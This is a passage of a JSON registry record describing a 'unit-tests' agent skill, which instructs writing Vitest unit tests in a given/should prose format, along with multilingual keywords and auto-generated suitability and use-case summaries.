código","depuración"],"fr":["tests unitaires","testing","ingénierie logicielle","développement de logiciel","qualité du logiciel","validation de code","débogage"],"de":["Einheitstests","Testing","Software-Ingenieurwesen","Software-Entwicklung","Software-Qualität","Code-Validierung","Fehlersuche"],"pt":["testes unitários","desenvolvimento de software","engenharia de software","testes de unidade","qualidade do código","desenvolvimento de habilidades de teste"],"ru":["юнит-тесты","разработка программного обеспечения","инженерия программного обеспечения","тесты единицы","качество кода","развитие навыков тестирования"],"ar":["اختبارات الوحدة","تطوير البرمجيات","هندسة البرمجيات","اختبارات الوحدة","جودة الشفرة","تطوير مهارات الاختبار"]}},"owner":"iulspop","repo":"personal-app-template-sqlite-fly-io","repoPath":"iulspop/personal-app-template-sqlite-fly-io","stars":0,"forks":0,"updatedAt":"2026-02-18T01:08:43.475Z","topics":[],"category":"community","skillMd":{"name":"unit-tests","description":"Generates well-structured unit tests using Vitest with the given/should prose format. Use when writing tests for new code, adding coverage to existing code, or following TDD practices.","bodyPreview":"# Unit Tests\n\nAct as a top-tier software engineer with serious testing skills.\n\nWrite unit tests for: $ARGUMENTS\n\nEach test must answer these 5 questions:\n\n1. What is the unit under test? (test should be in a named describe block)\n2. What is the expected behavior? ($given and $should arguments are adequate)\n3. What is the actual output? (the unit under test was exercised by the test)\n4. What is the expected output? ($expected and/or $should are adequate)\n5. How can we find the bug? (implicitly a","body":"# Unit Tests\n\nAct as a top-tier software engineer with serious testing skills.\n\nWrite unit tests for: $ARGUMENTS\n\nEach test must answer these 5 questions:\n\n1. What is the unit under test? (test should be in a named describe block)\n2. What is the expected behavior? ($given and $should arguments are adequate)\n3. What is the actual output? (the unit under test was exercised by the test)\n4. What is the expected output? ($expected and/or $should are adequate)\n5. How can we find the bug? (implicitly answered if the above questions are answered correctly)\n\n## Rules\n\n- Use Vitest with describe, expect, and test.\n- Tests must use the \"given: ..., should: ...\" prose format.\n- Colocate tests with functions. Test files should be in the same folder as the implementation file.\n- Use cuid2 for IDs unless specified otherwise.\n- If an argument is a database entity, use an existing factory function and override values as needed.\n- Capture the `actual` and the `expected` value in variables.\n- The top-level `describe` block should describe the component under test.\n- The `test` block should describe the case via `\"given: ..., should: ...\"`.\n- Avoid `expect.any(Constructor)` in assertions. Expect specific values instead.\n- Always use the `toEqual` equality assertion.\n- Empty line before `actual` variable assignment.\n- NO empty line between `actual` and `expected` assignments.\n- Empty line after `expected` variable assignment before the `toEqual` assertion.\n- Tests must be readable, isolated, thorough, and explicit.\n- Test expected edge cases.\n- Create factory functions for reused data structures rather than sharing mutable fixtures.\n\n## When NOT to use this skill\n\n- For React component render tests (`.test.tsx`), use `/happy-dom-tests` instead.\n- For database or server action tests (`.spec.ts`), use `/integration-tests` instead.\n- For browser-level user flow tests (`.e2e.ts`), use `/e2e-tests` instead.\n- This skill is for pure function unit tests (`.test.ts`) only.\n"},"lastSynced":"2026-02-18T09:14:09.828Z","agentAnalysis":{"suitability":{"en":"Perfect for Code Analysis Agents needing robust unit testing capabilities for ensuring code reliability and stability.","zh":"非常适合需要强大的单元测试能力以确保代码可靠性和稳定性的代码分析代理。","ja":"コード分析エージェントがコードの信頼性と安定性を確保するための強力な単体テスト機能を必要とする場合に最適です。","ko":"코드 분석 에이전트가 코드의 신뢰성과 안정성을 보장하기 위한 강력한 단위 테스트 기능을 필요로 하는 경우에 적합합니다.","es":"Perfecto para Agentes de Análisis de Código que necesitan capacidades de prueba de unidad robustas para garantizar la confiabilidad y estabilidad del código.","fr":"Parfait pour les Agents d''Analyse de Code ayant besoin de capacités de test unitaire robustes pour assurer la fiabilité et la stabilité du code.","de":"Perfekt für Code-Analyse-Agenten, die robuste Einheitstestfunktionen benötigen, um die Zuverlässigkeit und Stabilität des Codes zu gewährleisten.","pt":"Perfeito para Agentes de Análise de Código que necessitam de capacidades robustas de teste unitário para garantir a confiabilidade e estabilidade do código.","ru":"Идеально подходит для агентов анализа кода, которым необходимы мощные возможности единичного тестирования для обеспечения надежности и стабильности кода.","ar":"مثالي للوكلاء تحليل الشفرة الذين بحاجة إلى khảيات اختبار الوحدة المتينة لتأمين موثوقية الشفرة وثباتها."},"recommendation":{"en":"Empowers agents to write comprehensive unit tests using describe blocks, exercising units under test, and validating expected outputs against actual results, leveraging $given, $should, $expected, and $arguments for precise testing.","zh":"赋予代理编写全面的单元测试的能力，使用describe块，测试单元，验证预期输出与实际结果，并利用$given、$should、$expected和$arguments进行精确测试。","ja":"エージェントが包括的な単体テストを記述できるようにし、describeブロックを使用して単位をテストし、期待される出力と実際の結果を検証し、$given、$should、$expected、$argumentsを使用して正確なテストを行う。","ko":"에이전트가 포괄적인 단위 테스트를 작성할 수 있도록 해주며, describe 블록을 사용하여 단위를 테스트하고, 예상 출력과 실제 결과를 검증하며, $given, $should, $expected, $arguments를 사용하여 정확한 테스트를 수행합니다.","es":"Habilita a los agentes a escribir pruebas unitarias integrales utilizando bloques de descripción, ejercitando unidades bajo prueba y validando resultados esperados contra resultados reales, aprovechando $given, $should, $expected y $arguments para pruebas precisas.","fr":"Permet aux agents d''écrire des tests unitaires complets en utilisant des blocs de description, en exerçant les unités sous test et en validant les résultats attendus contre les résultats réels, en exploitant $given, $should, $expected et $arguments pour des tests précis.","de":"Ermöglicht es Agenten, umfassende Einheitentests mithilfe von Beschreibungsblöcken zu schreiben, Einheiten unter Test auszuüben und erwartete Ergebnisse gegen tatsächliche Ergebnisse zu validieren, wobei $given, $should, $expected und $arguments für präzise Tests genutzt werden.","pt":"Habilita os agentes a escrever testes unitários abrangentes usando blocos de descrição, exercitando unidades em teste e validando saídas esperadas contra resultados reais, utilizando $given, $should, $expected e $arguments para testes precisos.","ru":"Наделяет агентов возможностью писать полные единичные тесты с использованием блоков описания, тренировки единиц под тестированием и проверки ожидаемых результатов против фактических, используя $given, $should, $expected и $arguments для точного тестирования.","ar":"يمنح الوكلاء القدرة على كتابة اختبارات وحدة شاملة باستخدام كتلة وصف، وتمارين الوحدات قيد الاختبار، والتحقق من المخرجات المتوقعة مقابل النتائج الفعلية، باستخدام $given، $should، $expected، و $arguments لاختبار دقيق."},"useCases":{"en":["Writing unit tests for complex software modules","Validating expected behavior against actual output","Debugging code by identifying discrepancies between expected and actual results"],"zh":["为复杂软件模块编写单元测试","验证预期行为与实际输出","通过识别预期结果和实际结果之间的差异来调试代码"],"ja":["複雑なソフトウェアモジュールのための単体テストを記述する","期待される動作と実際の出力を検証する","期待される結果と実際の結果の差異を識別してコードをデバッグする"],"ko":["복잡한 소프트웨어 모듈을 위한 단위 테스트를 작성하는 것","예상 행동과 실제 출력을 검증하는 것","예상 결과와 실제 결과의 차이를 식별하여 코드를 디버깅하는 것"],"es":["Escribir pruebas unitarias para módulos de software complejos","Validar el comportamiento esperado contra la salida real","Depurar el código identificando discrepancias entre los resultados esperados y reales"],"fr":["Écrire des tests unitaires pour des modules de logiciel complexes","Valider le comportement attendu contre la sortie réelle","Déboguer le code en identifiant les écarts entre les résultats attendus et réels"],"de":["Schreiben von Einheitentests für komplexe Softwaremodule","Validieren des erwarteten Verhaltens gegen die tatsächliche Ausgabe","Debuggen des Codes durch Identifizierung von Diskrepanzen zwischen erwarteten und tatsächlichen Ergebnissen"],"pt":["Escrever testes unitários para módulos de software complexos","Validar comportamento esperado contra saída real","Depurar código identificando discrepâncias entre resultados esperados e reais"],"ru":["Написание единичных тестов для сложных программных модулей","Проверка ожидаемого поведения против фактической производительности","Отладка кода, выявляя несоответствия между ожидаемыми и фактическими результатами"],"ar":["كتابة اختبارات وحدة للمكونات البرمجية المعقدة","التحقق من السلوك المتوقع مقابل الإنتاجية الفعلية","تصحيح أخطاء الشفرة عن طريق تحديد الانحرافات بين النتائج المتوقعة والفعلية"]},"limitations":{"en":["Requires programming knowledge for test implementation","Limited to testing specific units of code"],"zh":["需要编程知识来实现测试","仅限于测试特定的代码单元"],"ja":["テストの実装にはプログラミング知識が必要","特定のコード単位のみをテストする"],"ko":["테스트 구현을 위해 프로그래밍 지식이 필요","특정 코드 단위만 테스트"],"es":["Requiere conocimientos de programación para la implementación de pruebas","Limitado a la prueba de unidades de código específicas"],"fr":["Nécessite des connaissances en programmation pour la mise en œuvre des tests","Limité à la mise à l''essai de unités de code spécifiques"],"de":["Benötigt Programmierkenntnisse für die Testimplementierung","Begrenzt auf die Prüfung spezifischer Codeeinheiten"],"pt":["Exige conhecimento de programação para implementação de testes","Limitado ao teste de unidades específicas de código"],"ru":["Требует знаний программирования для реализации тестирования","Ограничен тестированием определенных единиц кода"],"ar":["يتطلب معرفة بالبرمجة لتنفيذ الاختبارات","محدود باختبار وحدات محددة من الشفرة"]},"version":3},"qualityScore":20}');
